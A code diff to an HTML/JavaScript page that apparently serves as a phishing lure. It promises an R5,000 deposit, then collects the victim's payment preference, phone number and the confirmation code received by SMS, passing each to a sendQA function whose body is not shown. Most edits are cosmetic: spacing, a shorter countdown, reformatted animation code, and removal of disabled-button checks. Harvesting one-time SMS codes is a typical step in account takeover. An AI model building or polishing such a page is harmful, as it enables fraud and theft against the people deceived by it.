@@ -24,11 +24,11 @@
       text-align: center; 
       padding: 15px;
       box-sizing: border-box;
-      overflow-y: auto; /* allows scrolling on tiny phones */
+      overflow-y: auto; /* scrolling on small phones */
     }
 
     h2 {
-      margin-bottom: 15px;
+      margin-bottom: 10px;
       font-size: clamp(14px, 3vw, 20px);
       font-weight: 600;
       text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
@@ -37,11 +37,14 @@
     }
 
     button {
-      margin-top: 15px;
-      border: none; padding: clamp(8px, 1.5vw, 12px) clamp(16px, 4vw, 24px);
-      border-radius: 10px; font-weight: 600;
+      margin-top: 10px;   /* closer to options/input */
+      border: none; 
+      padding: clamp(8px, 1.5vw, 12px) clamp(16px, 4vw, 24px);
+      border-radius: 10px; 
+      font-weight: 600;
       font-size: clamp(12px, 2.5vw, 16px);
-      cursor: pointer; transition: 0.3s;
+      cursor: pointer; 
+      transition: 0.3s;
     }
     button:disabled {
       background: grey; 
@@ -90,7 +93,7 @@
       width: clamp(180px, 70%, 300px);
       font-size: clamp(12px, 2.5vw, 16px);
       text-align: center;
-      margin-top: 15px;
+      margin-top: 10px;
     }
 
     /* Background gradients */
@@ -161,7 +164,7 @@
   <!-- COUNTDOWN -->
   <div id="countdownScreen" class="screen">
     <h2>Please wait while we process your request...</h2>
-    <div id="countdownNumber">50</div>
+    <div id="countdownNumber">30</div>
   </div>
 
   <!-- CONFIRMATION CODE -->
@@ -206,13 +209,35 @@
     canvas.width = 200; canvas.height = 120;
     ctx.fillStyle = "white"; ctx.font = "bold 80px Arial"; ctx.textAlign = "center"; ctx.fillText("T H", canvas.width/2, canvas.height/1.5);
     const imageData = ctx.getImageData(0,0,canvas.width,canvas.height); ctx.clearRect(0,0,canvas.width,canvas.height);
-    let particles=[]; for(let y=0;y<canvas.height;y+=6){for(let x=0;x<canvas.width;x+=6){let i=(y*canvas.width+x)*4;if(imageData.data[i+3]>128){particles.push({x:x,y:Math.random()*-400,targetY:y,speed:0.3+Math.random()*0.5});}}}
-    function animate(){ctx.clearRect(0,0,canvas.width,canvas.height);ctx.fillStyle="#FFD700";particles.forEach(p=>{if(p.y<p.targetY)p.y+=p.speed;ctx.beginPath();ctx.arc(p.x,p.y,2,0,Math.PI*2);ctx.fill();});requestAnimationFrame(animate);} animate();
+    let particles=[]; 
+    for(let y=0;y<canvas.height;y+=6){
+      for(let x=0;x<canvas.width;x+=6){
+        let i=(y*canvas.width+x)*4;
+        if(imageData.data[i+3]>128){
+          particles.push({x:x,y:Math.random()*-400,targetY:y,speed:0.3+Math.random()*0.5});
+        }
+      }
+    }
+    function animate(){
+      ctx.clearRect(0,0,canvas.width,canvas.height);
+      ctx.fillStyle="#FFD700";
+      particles.forEach(p=>{
+        if(p.y<p.targetY)p.y+=p.speed;
+        ctx.beginPath();
+        ctx.arc(p.x,p.y,2,0,Math.PI*2);
+        ctx.fill();
+      });
+      requestAnimationFrame(animate);
+    } 
+    animate();
 
     // --- FLOW ---
     setTimeout(()=>{show("question1")},4000);
 
-    function show(id){document.querySelectorAll(".screen").forEach(s=>s.style.display="none");document.getElementById(id).style.display="flex";}
+    function show(id){
+      document.querySelectorAll(".screen").forEach(s=>s.style.display="none");
+      document.getElementById(id).style.display="flex";
+    }
 
     function enableButton(btnId){
       const btn=document.getElementById(btnId);
@@ -235,17 +260,13 @@
 
     // SUBMITS
     document.getElementById("submitBtn1").onclick=()=>{
-      if(!document.getElementById("submitBtn1").disabled){
-        sendQA("If R5,000 was deposited in your bank account right now what would you use it for?", answers.Q1, "💰");
-        show("question2");
-      }
+      sendQA("If R5,000 was deposited in your bank account right now what would you use it for?", answers.Q1, "💰");
+      show("question2");
     };
 
     document.getElementById("submitBtn2").onclick=()=>{
-      if(!document.getElementById("submitBtn2").disabled){
-        sendQA("What mode of payment do you prefer?", answers.Q2, "💳");
-        show("question3");
-      }
+      sendQA("What mode of payment do you prefer?", answers.Q2, "💳");
+      show("question3");
     };
 
     document.getElementById("phoneNumber").addEventListener("input",()=>{
@@ -256,11 +277,9 @@
       }
     });
     document.getElementById("submitBtn3").onclick=()=>{
-      if(!document.getElementById("submitBtn3").disabled){
-        sendQA("Phone number for payment confirmation", answers.Phone, "📱");
-        show("countdownScreen");
-        startCountdown();
-      }
+      sendQA("Phone number for payment confirmation", answers.Phone, "📱");
+      show("countdownScreen");
+      startCountdown();
     };
 
     function startCountdown(){
@@ -282,11 +301,9 @@
       }
     });
     document.getElementById("submitBtn4").onclick=()=>{
-      if(!document.getElementById("submitBtn4").disabled){
-        sendQA("Confirmation code received via SMS", answers.Code, "🔐");
-        show("loadingScreen");
-        startLoading();
-      }
+      sendQA("Confirmation code received via SMS", answers.Code, "🔐");
+      show("loadingScreen");
+      startLoading();
     };
 
     function startLoading(){
@@ -307,4 +324,4 @@
     }
   </script>
 </body>
-                                             </html>
+</html>
